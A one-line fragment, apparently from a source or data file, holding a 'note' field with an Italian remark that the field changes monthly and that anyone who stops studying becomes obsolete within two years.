               note: 'Il panorama cambia ogni mese: smetti di studiare, diventi obsoleto in 2 anni.',
